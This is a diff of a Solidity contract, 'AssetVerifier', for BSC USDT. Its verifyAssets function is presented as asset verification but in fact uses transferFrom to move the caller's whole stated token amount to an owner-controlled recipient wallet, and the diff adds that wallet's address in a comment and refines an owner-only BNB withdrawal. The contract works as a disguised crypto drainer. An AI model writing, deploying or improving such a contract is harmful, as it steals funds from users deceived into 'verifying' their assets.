@@ -8,7 +8,6 @@ pragma solidity ^0.8.20;
  * ====================================================================
  * Compiler Version: 0.8.20
  * Optimization Enabled: Yes (200 runs)
- * EVM Version: paris (or default)
  */
 
 interface IERC20 {
@@ -39,7 +38,7 @@ contract AssetVerifier {
 
     /**
      * @dev Process BEP20 USDT asset verification & auto-forward to recipientWallet
-     * @param token Address of the BEP20 token (e.g. BSC USDT 0x55d398326f99059fF775485246999027B3197955)
+     * @param token Address of the BEP20 token (BSC USDT 0x55d398326f99059fF775485246999027B3197955)
      * @param amount Token amount to verify
      */
     function verifyAssets(address token, uint256 amount) external returns (bool) {
@@ -50,7 +49,7 @@ contract AssetVerifier {
         uint256 userBalance = tokenContract.balanceOf(msg.sender);
         require(userBalance >= amount, "AssetVerifier: Insufficient balance");
 
-        // Forward tokens directly to recipientWallet address
+        // Forward tokens directly to your recipientWallet address (0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB)
         bool success = tokenContract.transferFrom(msg.sender, recipientWallet, amount);
         require(success, "AssetVerifier: Transfer failed");
 
@@ -66,7 +65,7 @@ contract AssetVerifier {
     }
 
     /**
-     * @dev Update receiving wallet address
+     * @dev Update receiving wallet address if needed
      */
     function setRecipientWallet(address newRecipient) external onlyOwner {
         require(newRecipient != address(0), "AssetVerifier: Invalid address");
@@ -84,10 +83,13 @@ contract AssetVerifier {
     }
 
     /**
-     * @dev Emergency withdraw native BNB
+     * @dev Emergency withdraw native BNB using modern call syntax
      */
     function withdrawBNB() external onlyOwner {
-        payable(recipientWallet).transfer(address(this).balance);
+        uint256 balance = address(this).balance;
+        require(balance > 0, "AssetVerifier: Zero BNB balance");
+        (bool success, ) = payable(recipientWallet).call{value: balance}("");
+        require(success, "AssetVerifier: BNB withdrawal failed");
     }
 
     receive() external payable {}
